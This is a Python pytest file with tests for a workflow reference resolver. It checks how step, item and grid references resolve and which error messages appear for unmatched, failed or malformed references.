def test_a_step_reads_its_matching_item_in_a_step_it_shares_a_grid_with(paired_scope: ReferenceScope) -> None:
    assert resolve("${steps.spread.item.output.path}", paired_scope) == "s3://bucket/oslo.json"
    assert resolve("${steps.spread.item.output}", paired_scope) == {"path": "s3://bucket/oslo.json"}


def test_a_grid_resolves_to_the_list_the_step_maps_over(paired_scope: ReferenceScope) -> None:
    assert resolve("${steps.spread.items}", paired_scope) == ["bergen", "oslo"]


def test_a_matching_item_outside_the_grid_family_names_the_for_each_that_would_pair_them() -> None:
    scope = ReferenceScope(item_index=0)
    with pytest.raises(UnknownReference, match=r"write for_each: \$\{steps.spread.items\}"):
        resolve("${steps.spread.item.output.path}", scope)


def test_a_matching_item_that_did_not_succeed_says_which_item(paired_scope: ReferenceScope) -> None:
    scope = paired_scope.model_copy(update={"item_outputs": {}})
    with pytest.raises(UnknownReference, match="'spread'.s item 1 did not succeed"):
        resolve("${steps.spread.item.output.path}", scope)


def test_a_grid_nothing_holds_says_only_for_each_reads_it(scope: ReferenceScope) -> None:
    with pytest.raises(UnknownReference, match="only for_each reads it"):
        resolve("${steps.fetch.items}", scope)


def test_a_malformed_step_reference_lists_the_three_forms(scope: ReferenceScope) -> None:
    with pytest.raises(UnknownReference, match="steps.<name>.item.output.<field>"):
        resolve("${steps.fetch.body}", scope)
